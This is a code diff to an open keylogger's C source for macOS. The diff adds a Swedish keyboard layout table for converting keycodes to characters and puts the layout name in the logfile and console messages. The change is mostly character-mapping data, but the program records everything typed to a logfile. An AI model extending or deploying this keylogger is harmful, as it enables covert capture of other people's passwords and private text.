@@ -44,11 +44,11 @@ int main(int argc, const char *argv[]) {
     }
 
     // Output to logfile.
-    fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result)));
+    fprintf(logfile, "\n\nKeylogging has begun for layout=%s.\n%s\n", keyboard, asctime(localtime(&result)));
     fflush(logfile);
 
     // Display the location of the logfile and start the loop.
-    printf("Logging to: %s\n", logfileLocation);
+    printf("Logging to for layout=%s: %s\n", keyboard, logfileLocation);
     fflush(stdout);
     CFRunLoopRun();
 
@@ -117,6 +117,55 @@ const char *convertKeyCode(int keyCode, bool shift, bool caps) {
     static char unknownKey[12];
 
     switch ((int) keyCode) {
+#if KEYBOARD_SV
+        case 0:   return shift || caps ? "A" : "a";
+        case 1:   return shift || caps ? "S" : "s";
+        case 2:   return shift || caps ? "D" : "d";
+        case 3:   return shift || caps ? "F" : "f";
+        case 4:   return shift || caps ? "H" : "h";
+        case 5:   return shift || caps ? "G" : "g";
+        case 6:   return shift || caps ? "Z" : "z";
+        case 7:   return shift || caps ? "X" : "x";
+        case 8:   return shift || caps ? "C" : "c";
+        case 9:   return shift || caps ? "V" : "v";
+        case 11:  return shift || caps ? "B" : "b";
+        case 12:  return shift || caps ? "Q" : "q";
+        case 13:  return shift || caps ? "W" : "w";
+        case 14:  return shift || caps ? "E" : "e";
+        case 15:  return shift || caps ? "R" : "r";
+        case 16:  return shift || caps ? "Y" : "y";
+        case 17:  return shift || caps ? "T" : "t";
+        case 18:  return shift ? "!" : "1";
+        case 19:  return shift ? "\"" : "2";
+        case 20:  return shift ? "#" : "3";
+        case 21:  return shift ? "€" : "4";
+        case 22:  return shift ? "&" : "6";
+        case 23:  return shift ? "%" : "5";
+        case 24:  return shift ? "`" : "´";
+        case 25:  return shift ? ")" : "9";
+        case 26:  return shift ? "/" : "7";
+        case 27:  return shift ? "?" : "+";
+        case 28:  return shift ? "(" : "8";
+        case 29:  return shift ? "=" : "0";
+        case 30:  return shift ? "^" : "¨";
+        case 31:  return shift || caps ? "O" : "o";
+        case 32:  return shift || caps ? "U" : "u";
+        case 33:  return shift || caps ? "Å" : "å";
+        case 34:  return shift || caps ? "I" : "i";
+        case 35:  return shift || caps ? "P" : "p";
+        case 37:  return shift || caps ? "L" : "l";
+        case 38:  return shift || caps ? "J" : "j";
+        case 39:  return shift || caps ? "Ä" : "ä";
+        case 40:  return shift || caps ? "K" : "k";
+        case 41:  return shift || caps ? "Ö" : "ö";
+        case 42:  return shift ? "*" : "'";
+        case 43:  return shift ? ";" : ",";
+        case 44:  return shift ? "_" : "-";
+        case 45:  return shift || caps ? "N" : "n";
+        case 46:  return shift || caps ? "M" : "m";
+        case 47:  return shift ? ":" : ".";
+        case 50:  return shift ? "~" : "`";
+#else
         case 0:   return shift || caps ? "A" : "a";
         case 1:   return shift || caps ? "S" : "s";
         case 2:   return shift || caps ? "D" : "d";
@@ -164,6 +213,7 @@ const char *convertKeyCode(int keyCode, bool shift, bool caps) {
         case 46:  return shift || caps ? "M" : "m";
         case 47:  return shift ? ">" : ".";
         case 50:  return shift ? "~" : "`";
+#endif
         case 65:  return "[decimal]";
         case 67:  return "[asterisk]";
         case 69:  return "[plus]";
